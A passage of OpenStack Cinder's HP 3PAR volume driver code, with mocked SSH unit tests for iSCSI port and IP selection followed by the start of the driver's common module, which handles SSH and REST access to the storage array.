self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_port_cmd = ['showport']\n        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])\n\n        show_port_i_cmd = ['showport', '-iscsi']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),\n                                                    ''])\n\n        show_port_i_cmd = ['showport', '-iscsiname']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI),\n                                                    ''])\n        self.mox.ReplayAll()\n\n        ports = self.driver.common.get_ports()\n        self.assertEqual(ports['FC'][0], '20210002AC00383D')\n        self.assertEqual(ports['iSCSI']['10.10.120.252']['nsp'], '0:8:2')\n\n    def test_get_iscsi_ip_active(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record set up\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_port_cmd = ['showport']\n        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])\n\n        show_port_i_cmd = ['showport', '-iscsi']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),\n                                                    ''])\n\n        show_port_i_cmd = ['showport', '-iscsiname']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])\n\n        self.mox.ReplayAll()\n\n        config = self.setup_configuration()\n        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']\n        self.setup_driver(config, set_up_fakes=False)\n\n        #record\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN), ''])\n\n        self.mox.ReplayAll()\n\n        ip = self.driver._get_iscsi_ip('fakehost')\n        self.assertEqual(ip, '10.10.220.253')\n\n    def test_get_iscsi_ip(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record driver set up\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_port_cmd = ['showport']\n        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])\n\n        show_port_i_cmd = ['showport', '-iscsi']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),\n                                                    ''])\n\n        show_port_i_cmd = ['showport', '-iscsiname']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])\n\n        #record\n        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']\n        show_vlun_ret = 'no vluns listed\\r\\n'\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(show_vlun_ret), ''])\n        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])\n\n        self.mox.ReplayAll()\n\n        config = self.setup_configuration()\n        config.iscsi_ip_address = '10.10.10.10'\n        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']\n        self.setup_driver(config, set_up_fakes=False)\n\n        ip = self.driver._get_iscsi_ip('fakehost')\n        self.assertEqual(ip, '10.10.220.252')\n\n    def test_invalid_iscsi_ip(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record driver set up\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_port_cmd = ['showport']\n        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])\n\n        show_port_i_cmd = ['showport', '-iscsi']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),\n                                                    ''])\n\n        show_port_i_cmd = ['showport', '-iscsiname']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])\n\n        config = self.setup_configuration()\n        config.hp3par_iscsi_ips = ['10.10.220.250', '10.10.220.251']\n        config.iscsi_ip_address = '10.10.10.10'\n        self.mox.ReplayAll()\n\n        # no valid ip addr should be configured.\n        self.assertRaises(exception.InvalidInput,\n                          self.setup_driver,\n                          config,\n                          set_up_fakes=False)\n\n    def test_get_least_used_nsp(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])\n\n        self.mox.ReplayAll()\n        # in use count                           11       12\n        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:8:1'])\n        self.assertEqual(nsp, '0:2:1')\n\n        # in use count                            11       10\n        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:2:1'])\n        self.assertEqual(nsp, '1:2:1')\n\n        # in use count                            0       10\n        nsp = self.driver._get_least_used_nsp(['1:1:1', '1:2:1'])\n        self.assertEqual(nsp, '1:1:1')\n\n\ndef pack(arg):\n    header = '\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n'\n    footer = '\\r\\n\\r\\n\\r\\n'\n    return header + arg + footer\n\nFC_HOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '75,fakehost,Generic,50014380242B8B4C,0:2:1,n/a\\r\\n'\n    '75,fakehost,Generic,50014380242B8B4E,---,n/a\\r\\n'\n    '75,fakehost,Generic,1000843497F90711,0:2:1,n/a \\r\\n'\n    '75,fakehost,Generic,1000843497F90715,1:2:1,n/a\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost ----------\\r\\n'\n    'Name       : fakehost\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nFC_SHOWHOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '75,fakehost.foo,Generic,50014380242B8B4C,0:2:1,n/a\\r\\n'\n    '75,fakehost.foo,Generic,50014380242B8B4E,---,n/a\\r\\n'\n    '75,fakehost.foo,Generic,1000843497F90711,0:2:1,n/a \\r\\n'\n    '75,fakehost.foo,Generic,1000843497F90715,1:2:1,n/a\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost.foo,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost.foo ----------\\r\\n'\n    'Name       : fakehost.foo\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nNO_FC_HOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost ----------\\r\\n'\n    'Name       : fakehost\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nISCSI_HOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '75,fakehost,Generic,iqn.1993-08.org.debian:01:222,---,10.10.222.12\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost ----------\\r\\n'\n    'Name       : fakehost\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nISCSI_NO_HOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost ----------\\r\\n'\n    'Name       : fakehost\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nISCSI_PORT_IDS_RET = (\n    'N:S:P,-Node_WWN/IPAddr-,-----------Port_WWN/iSCSI_Name-----------\\r\\n'\n    '0:2:1,28210002AC00383D,20210002AC00383D\\r\\n'\n    '0:2:2,2FF70002AC00383D,20220002AC00383D\\r\\n'\n    '0:2:3,2FF70002AC00383D,20230002AC00383D\\r\\n'\n    '0:2:4,2FF70002AC00383D,20240002AC00383D\\r\\n'\n    '0:5:1,2FF70002AC00383D,20510002AC00383D\\r\\n'\n    '0:5:2,2FF70002AC00383D,20520002AC00383D\\r\\n'\n    '0:5:3,2FF70002AC00383D,20530002AC00383D\\r\\n'\n    '0:5:4,2FF70202AC00383D,20540202AC00383D\\r\\n'\n    '0:6:4,2FF70002AC00383D,20640002AC00383D\\r\\n'\n    '0:8:1,10.10.120.253,iqn.2000-05.com.3pardata:21810002ac00383d\\r\\n'\n    '0:8:2,0.0.0.0,iqn.2000-05.com.3pardata:20820002ac00383d\\r\\n'\n    '1:2:1,29210002AC00383D,21210002AC00383D\\r\\n'\n    '1:2:2,2FF70002AC00383D,21220002AC00383D\\r\\n'\n    '-----------------------------------------------------------------\\r\\n')\n\nVOLUME_STATE_RET = (\n    'Id,Name,Prov,Type,State,-Detailed_State-\\r\\n'\n    '410,volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7,snp,vcopy,normal,'\n    'normal\\r\\n'\n    '-----------------------------------------------------------------\\r\\n')\n\nPORT_RET = (\n    'N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,Protocol,'\n    'Label,Partner,FailoverState\\r\\n'\n    '0:2:1,target,ready,28210002AC00383D,20210002AC00383D,host,FC,'\n    '-,1:2:1,none\\r\\n'\n    '0:2:2,initiator,loss_sync,2FF70002AC00383D,20220002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:2:3,initiator,loss_sync,2FF70002AC00383D,20230002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:2:4,initiator,loss_sync,2FF70002AC00383D,20240002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:5:1,initiator,loss_sync,2FF70002AC00383D,20510002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:5:2,initiator,loss_sync,2FF70002AC00383D,20520002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:5:3,initiator,loss_sync,2FF70002AC00383D,20530002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:5:4,initiator,ready,2FF70202AC00383D,20540202AC00383D,host,FC,'\n    '-,1:5:4,active\\r\\n'\n    '0:6:1,initiator,ready,2FF70002AC00383D,20610002AC00383D,disk,FC,'\n    '-,-,-\\r\\n'\n    '0:6:2,initiator,ready,2FF70002AC00383D,20620002AC00383D,disk,FC,'\n    '-,-,-\\r\\n')\n\nISCSI_PORT_RET = (\n    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'\n    'iSNS_Port\\r\\n'\n    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'\n    '0,0.0.0.0,3205\\r\\n'\n    '0:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,82,1500,n/a,0,0.0.0.0,3205\\r\\n'\n    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'\n    '0,0.0.0.0,3205\\r\\n'\n    '1:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,182,1500,n/a,0,0.0.0.0,3205\\r\\n')\n\nISCSI_3PAR_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '75,fakehost.foo,Generic,iqn.1993-08.org.debian:01:222,---,'\n    '10.10.222.12\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost.foo,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost.foo ----------\\r\\n'\n    'Name       : fakehost.foo\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nSHOW_PORT_ISCSI = (\n    'N:S:P,IPAddr,---------------iSCSI_Name----------------\\r\\n'\n    '0:8:1,1.1.1.2,iqn.2000-05.com.3pardata:21810002ac00383d\\r\\n'\n    '0:8:2,10.10.120.252,iqn.2000-05.com.3pardata:20820002ac00383d\\r\\n'\n    '1:8:1,10.10.220.253,iqn.2000-05.com.3pardata:21810002ac00383d\\r\\n'\n    '1:8:2,10.10.220.252,iqn.2000-05.com.3pardata:21820002ac00383d\\r\\n'\n    '-------------------------------------------------------------\\r\\n')\n\nSHOW_VLUN = (\n    'Lun,VVName,HostName,---------Host_WWN/iSCSI_Name----------,Port,Type,'\n    'Status,ID\\r\\n'\n    '0,a,fakehost,iqn.1993-08.org.debian:01:3a779e4abc22,1:8:1,matched set,'\n    'active,0\\r\\n'\n    '------------------------------------------------------------------------'\n    '--------------\\r\\n')\n\nSHOW_VLUN_NONE = (\n    'Port\\r\\n0:2:1\\r\\n0:2:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n1:2:1\\r\\n'\n    '1:2:1\\r\\n1:2:1\\r\\n1:2:1\\r\\n1:2:1\\r\\n1:2:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n'\n    '1:8:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n'\n    '0:2:1\\r\\n0:2:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n1:2:1\\r\\n1:2:1\\r\\n'\n    '1:2:1\\r\\n1:2:1\\r\\n1:8:1\\r\\n-----')\n\nREADY_ISCSI_PORT_RET = (\n    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'\n    'iSNS_Port\\r\\n'\n    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'\n    '0,0.0.0.0,3205\\r\\n'\n    '0:8:2,ready,10.10.120.252,255.255.224.0,0.0.0.0,82,1500,10Gbps,0,'\n    '0.0.0.0,3205\\r\\n'\n    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'\n    '0,0.0.0.0,3205\\r\\n'\n    '1:8:2,ready,10.10.220.252,255.255.224.0,0.0.0.0,182,1500,10Gbps,0,'\n    '0.0.0.0,3205\\r\\n'\n    '-------------------------------------------------------------------'\n    '----------------------\\r\\n')\n/n/n/ncinder/volume/drivers/san/hp/hp_3par_common.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver common utilities for HP 3PAR Storage array\n\nThe 3PAR drivers requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nThe drivers uses both the REST service and the SSH\ncommand line to correctly operate.  Since the\nssh credentials and the REST credentials can be different\nwe need to have settings for both.\n\nThe drivers requires the use of the san_ip, san_login,\nsan_password settings for ssh connections into the 3PAR\narray.   It also requires the setting of\nhp3par_api_url, hp3par_username, hp3par_password\nfor credentials to talk to the REST service on the 3PAR\narray.\n\"\"\"\n\nimport ast\nimport base64\nimport json\nimport paramiko\nimport pprint\nfrom random import randint\nimport re\nimport time\nimport uuid\n\nfrom eventlet import greenthread\nfrom hp3parclient import client\nfrom hp3parclient import exceptions as hpexceptions\nfrom oslo.config import cfg\n\nfrom cinder import context\nfrom cinder import exception\nfrom cinder.openstack.common import excutils\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nfrom cinder.volume import volume_types\n\n\nLOG = logging.getLogger(__name__)\n\nhp3par_opts = [\n    cfg.StrOpt('hp3par_api_url',\n               default='',\n               help=\"3PAR WSAPI Server Url like \"\n                    \"https://<3par ip>:8080/api/v1\"),\n    cfg.StrOpt('hp3par_username',\n               default='',\n               help=\"3PAR Super user username\"),\n    cfg.StrOpt('hp3par_password',\n               default='',\n               help=\"3PAR Super user password\",\n               secret=True),\n    #TODO(kmartin): Remove hp3par_domain during I release.\n    cfg.StrOpt('hp3par_domain',\n               default=None,\n               help=\"This option is DEPRECATED and no longer used. \"\n                    \"The 3par domain name to use.\"),\n    cfg.StrOpt('hp3par_cpg',\n               default=\"OpenStack\",\n               help=\"The CPG to use for volume creation\"),\n    cfg.StrOpt('hp3par_cpg_snap',\n               default=\"\",\n               help=\"The CPG to use for Snapshots for volumes. \"\n                    \"If empty hp3par_cpg will be used\"),\n    cfg.StrOpt('hp3par_snapshot_retention',\n               default=\"\",\n               help=\"The time in hours to retain a snapshot.  \"\n                    \"You can't delete it before this expires.\"),\n    cfg.StrOpt('hp3par_snapshot_expiration',\n               default=\"\",\n               help=\"The time in hours when a snapshot expires \"\n                    \" and is deleted.  This must be larger than expiration\"),\n    cfg.BoolOpt('hp3par_debug',\n                default=False,\n                help=\"Enable HTTP debugging to 3PAR\"),\n    cfg.ListOpt('hp3par_iscsi_ips',\n                default=[],\n                help=\"List of target iSCSI addresses to use.\")\n]\n\n\nCONF = cfg.CONF\nCONF.register_opts(hp3par_opts)\n\n\nclass HP3PARCommon(object):\n\n    stats = {}\n\n    # Valid values for volume type extra specs\n    # The first value in the list is the default value\n    valid_prov_values = ['thin', 'full']\n    valid_persona_values = ['1 - Generic',\n                            '2 - Generic-ALUA',\n                            '6 - Generic-legacy',\n                            '7 - HPUX-legacy',\n                            '8 - AIX-legacy',\n                            '9 - EGENERA',\n                            '10 - ONTAP-legacy',\n                            '11 - VMware',\n                            '12 - OpenVMS']\n    hp_qos_keys = ['maxIOPS', 'maxBWS']\n    hp3par_valid_keys = ['cpg', 'snap_cpg', 'provisioning', 'persona', 'vvs']\n\n    def __init__(self, config):\n        self.sshpool = None\n        self.config = config\n        self.hosts_naming_dict = dict()\n        self.client = None\n        if CONF.hp3par_domain is not None:\n            LOG.deprecated(_(\"hp3par_domain has been deprecated and \"\n                             \"is no longer used. The domain is automatically \"\n                             \"looked up based on the CPG.\"))\n\n    def check_flags(self, options, required_flags):\n        for flag in required_flags:\n            if not getattr(options, flag, None):\n                raise exception.InvalidInput(reason=_('%s is not set') % flag)\n\n    def _create_client(self):\n        return client.HP3ParClient(self.config.hp3par_api_url)\n\n    def client_login(self):\n        try:\n            LOG.debug(\"Connecting to 3PAR\")\n            self.client.login(self.config.hp3par_username,\n                              self.config.hp3par_password)\n        except hpexceptions.HTTPUnauthorized as ex:\n            LOG.warning(\"Failed to connect to 3PAR (%s) because %s\" %\n                       (self.config.hp3par_api_url, str(ex)))\n            msg = _(\"Login to 3PAR array invalid\")\n            raise exception.InvalidInput(reason=msg)\n\n    def client_logout(self):\n        self.client.logout()\n        LOG.debug(\"Disconnect from 3PAR\")\n\n    def do_setup(self, context):\n        self.client = self._create_client()\n        if self.config.hp3par_debug:\n            self.client.debug_rest(True)\n\n        self.client_login()\n\n        try:\n            # make sure the default CPG exists\n            self.validate_cpg(self.config.hp3par_cpg)\n            self._set_connections()\n        finally:\n            self.client_logout()\n\n    def validate_cpg(self, cpg_name):\n        try:\n            cpg = self.client.getCPG(cpg_name)\n        except hpexceptions.HTTPNotFound as ex:\n            err = (_(\"CPG (%s) doesn't exist on array\") % cpg_name)\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n\n    def _set_connections(self):\n        \"\"\"Set the number of concurrent connections.\n\n        The 3PAR WS API server has a limit of concurrent connections.\n        This is setting the number to the highest allowed, 15 connections.\n        \"\"\"\n        self._cli_run(['setwsapi', '-sru', 'high'])\n\n    def get_domain(self, cpg_name):\n        try:\n            cpg = self.client.getCPG(cpg_name)\n        except hpexceptions.HTTPNotFound:\n            err = (_(\"Failed to get domain because CPG (%s) doesn't \"\n                     \"exist on array.\") % cpg_name)\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n\n        domain = cpg['domain']\n        if not domain:\n            err = (_(\"CPG (%s) must be in a domain\") % cpg_name)\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n        return domain\n\n    def extend_volume(self, volume, new_size):\n        volume_name = self._get_3par_vol_name(volume['id'])\n        old_size = volume.size\n        growth_size = int(new_size) - old_size\n        LOG.debug(\"Extending Volume %s from %s to %s, by %s GB.\" %\n                  (volume_name, old_size, new_size, growth_size))\n        try:\n            self._cli_run(['growvv', '-f', volume_name, '%dg' % growth_size])\n        except Exception:\n            with excutils.save_and_reraise_exception():\n                LOG.error(_(\"Error extending volume %s\") % volume)\n\n    def _get_3par_vol_name(self, volume_id):\n        \"\"\"Get converted 3PAR volume name.\n\n        Converts the openstack volume id from\n        ecffc30f-98cb-4cf5-85ee-d7309cc17cd2\n        to\n        osv-7P.DD5jLTPWF7tcwnMF80g\n\n        We convert the 128 bits of the uuid into a 24character long\n        base64 encoded string to ensure we don't exceed the maximum\n        allowed 31 character name limit on 3Par\n\n        We strip the padding '=' and replace + with .\n        and / with -\n        \"\"\"\n        volume_name = self._encode_name(volume_id)\n        return \"osv-%s\" % volume_name\n\n    def _get_3par_snap_name(self, snapshot_id):\n        snapshot_name = self._encode_name(snapshot_id)\n        return \"oss-%s\" % snapshot_name\n\n    def _get_3par_vvs_name(self, volume_id):\n        vvs_name = self._encode_name(volume_id)\n        return \"vvs-%s\" % vvs_name\n\n    def _encode_name(self, name):\n        uuid_str = name.replace(\"-\", \"\")\n        vol_uuid = uuid.UUID('urn:uuid:%s' % uuid_str)\n        vol_encoded = base64.b64encode(vol_uuid.bytes)\n\n        # 3par doesn't allow +, nor /\n        vol_encoded = vol_encoded.replace('+', '.')\n        vol_encoded = vol_encoded.replace('/', '-')\n        # strip off the == as 3par doesn't like those.\n        vol_encoded = vol_encoded.replace('=', '')\n        return vol_encoded\n\n    def _capacity_from_size(self, vol_size):\n\n        # because 3PAR volume sizes are in\n        # Mebibytes, Gigibytes, not Megabytes.\n        MB = 1000L\n        MiB = 1.048576\n\n        if int(vol_size) == 0:\n            capacity = MB  # default: 1GB\n        else:\n            capacity = vol_size * MB\n\n        capacity = int(round(capacity / MiB))\n        return capacity\n\n    def _cli_run(self, cmd):\n        \"\"\"Runs a CLI command over SSH, without doing any result parsing.\"\"\"\n        LOG.debug(\"SSH CMD = %s \" % cmd)\n\n        (stdout, stderr) = self._run_ssh(cmd, False)\n\n        # we have to strip out the input and exit lines\n        tmp = stdout.split(\"\\r\\n\")\n        out = tmp[5:len(tmp) - 2]\n        return out\n\n    def _ssh_execute(self, ssh, cmd, check_exit_code=True):\n        \"\"\"We have to do this in order to get CSV output from the CLI command.\n\n        We first have to issue a command to tell the CLI that we want the\n        output to be formatted in CSV, then we issue the real command.\n        \"\"\"\n        LOG.debug(_('Running cmd (SSH): %s'), cmd)\n\n        channel = ssh.invoke_shell()\n        stdin_stream = channel.makefile('wb')\n        stdout_stream = channel.makefile('rb')\n        stderr_stream = channel.makefile('rb')\n\n        stdin_stream.write('''setclienv csvtable 1\n%s\nexit\n''' % cmd)\n\n        # stdin.write('process_input would go here')\n        # stdin.flush()\n\n        # NOTE(justinsb): This seems suspicious...\n        # ...other SSH clients have buffering issues with this approach\n        stdout = stdout_stream.read()\n        stderr = stderr_stream.read()\n        stdin_stream.close()\n        stdout_stream.close()\n        stderr_stream.close()\n\n        exit_status = channel.recv_exit_status()\n\n        # exit_status == -1 if no exit code was returned\n        if exit_status != -1:\n            LOG.debug(_('Result was %s') % exit_status)\n            if check_exit_code and exit_status != 0:\n                raise exception.ProcessExecutionError(exit_code=exit_status,\n                                                      stdout=stdout,\n                                                      stderr=stderr,\n                                                      cmd=cmd)\n        channel.close()\n        return (stdout, stderr)\n\n    def _run_ssh(self, cmd_list, check_exit=True, attempts=1):\n        utils.check_ssh_injection(cmd_list)\n        command = ' '. join(cmd_list)\n\n        if not self.sshpool:\n            self.sshpool = utils.SSHPool(self.config.san_ip,\n                                         self.config.san_ssh_port,\n                                         self.config.ssh_conn_timeout,\n                                         self.config.san_login,\n                                         password=self.config.san_password,\n                                         privatekey=\n                                         self.config.san_private_key,\n                                         min_size=\n                                         self.config.ssh_min_pool_conn,\n                                         max_size=\n                                         self.config.ssh_max_pool_conn)\n        try:\n            total_attempts = attempts\n            with self.sshpool.item() as ssh:\n                while attempts > 0:\n                    attempts -= 1\n                    try:\n                        return self._ssh_execute(ssh, command,\n                                                 check_exit_code=check_exit)\n                    except Exception as e:\n                        LOG.error(e)\n                        greenthread.sleep(randint(20, 500) / 100.0)\n                msg = (_(\"SSH Command failed after '%(total_attempts)r' \"\n                         \"attempts : '%(command)s'\") %\n                       {'total_attempts': total_attempts, 'command': command})\n                raise paramiko.SSHException(msg)\n        except Exception:\n            with excutils.save_and_reraise_exception():\n                LOG.error(_(\"Error running ssh command: %s\") % command)\n\n    def _delete_3par_host(self, hostname):\n        self._cli_run(['removehost', hostname])\n\n    def _create_3par_vlun(self, volume, hostname):\n        out = self._cli_run(['createvlun', volume, 'auto', hostname])\n        if out and len(out) > 1:\n            if \"must be in the same domain\" in out[0]:\n                err = out[0].strip()\n                err = err + \" \" + out[1].strip()\n                raise exception.Invalid3PARDomain(err=err)\n\n    def _safe_hostname(self, hostname):\n        \"\"\"We have to use a safe hostname length for 3PAR host names.\"\"\"\n        try:\n            index = hostname.index('.')\n        except ValueError:\n            # couldn't find it\n            index = len(hostname)\n\n        # we'll just chop this off for now.\n        if index > 23:\n            index = 23\n\n        return hostname[:index]\n\n    def _get_3par_host(self, hostname):\n        out = self._cli_run(['showhost', '-verbose', hostname])\n        LOG.debug(\"OUTPUT = \\n%s\" % (pprint.pformat(out)))\n        host = {'id': None, 'name': None,\n                'domain': None,\n                'descriptors': {},\n                'iSCSIPaths': [],\n                'FCPaths': []}\n\n        if out:\n            err = out[0]\n            if err == 'no hosts listed':\n                msg = {'code': 'NON_EXISTENT_HOST',\n                       'desc': \"HOST '%s' was not found\" % hostname}\n                raise hpexceptions.HTTPNotFound(msg)\n\n            # start parsing the lines after the header line\n            for line in out[1:]:\n                if line == '':\n                    break\n                tmp = line.split(',')\n                paths = {}\n\n                LOG.debug(\"line = %s\" % (pprint.pformat(tmp)))\n                host['id'] = tmp[0]\n                host['name'] = tmp[1]\n\n                portPos = tmp[4]\n                LOG.debug(\"portPos = %s\" % (pprint.pformat(portPos)))\n                if portPos == '---':\n                    portPos = None\n                else:\n                    port = portPos.split(':')\n                    portPos = {'node': 